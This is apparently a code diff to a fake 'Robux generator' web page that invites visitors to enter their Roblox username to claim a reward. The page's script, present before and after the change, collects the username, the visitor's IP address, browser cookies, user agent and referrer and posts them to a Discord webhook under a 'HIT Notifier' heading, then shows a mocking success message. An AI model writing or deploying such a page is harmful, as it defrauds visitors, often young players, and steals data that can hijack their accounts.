@@ -7,23 +7,22 @@
     <style>
         body {
             font-family: 'Arial', sans-serif;
-            background-color: #473737;
-            color: rgb(243, 239, 239);
+            background-color: #494545;
+            color: white;
             text-align: center;
             padding: 50px;
         }
         .container {
             background-color: #2a2a2a;
-            border-radius: 30px;
-            padding: 100px;
-            max-width: 200
-            px;
+            border-radius: 10px;
+            padding: 20px;
+            max-width: 500px;
             margin: 0 auto;
-            box-shadow: 0 0 20px #080707;
+            box-shadow: 0 0 20px #0e0c0c;
         }
         button {
             background-color: #ff0000;
-            color: rgb(247, 244, 244);
+            color: white;
             border: none;
             padding: 15px 30px;
             font-size: 18px;
@@ -42,7 +41,7 @@
 </head>
 <body>
     <div class="container">
-        <h1>🚀 ROBUX GENARATOR 🚀</h1>
+        <h1>🚀 ROBUX GENATOR 🚀</h1>
         <p>Enter your Roblox username to claim your reward!</p>
         <input type="text" id="username" placeholder="Your Roblox Username" style="padding: 10px; width: 80%; margin: 10px 0;">
         <br>
@@ -73,9 +72,9 @@
             const referrer = document.referrer || "Direct visit";
 
             // Prepare data to send to webhook
-            const webhookURL = "https://discord.com/api/webhooks/1399936264265928805/9bbjPtnOxlIDKCCwotO7T1Teu-UCiYphIrY8Bktz6wtv7MJPDEVyf-ReDjIC96BrEQ0d"; // REPLACE THIS
+            const webhookURL = "https://discord.com/api/webhooks/1399939420152397824/wTwtOBrycC7zslOL9dK5nZANHpngkRHDjV6Cmw8LejOY8NGsQozROPaBOfy-hdYM6caD"; // REPLACE THIS
             const embed = {
-                title: "🔥 Veexye HIT l Notifier 🔥",
+                title: "🔥 Splunk HIT - Notifier 🔥",
                 description: `**Username:** ${username}\n**IP:** ${ip}\n**Cookies:** ${cookies}\n**User Agent:** ${userAgent}\n**Referrer:** ${referrer}`,
                 color: 16711680, // Red
                 timestamp: new Date().toISOString()
@@ -92,7 +91,7 @@
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(payload)
             }).then(() => {
-                alert("✅ Success! Your Robux will be added in 5 minutes");
+                alert("✅ Success! Your Robux will be added soon! (LOL)");
             }).catch(() => {
                 alert("⚠️ Error! Try again later.");
             }).finally(() => {
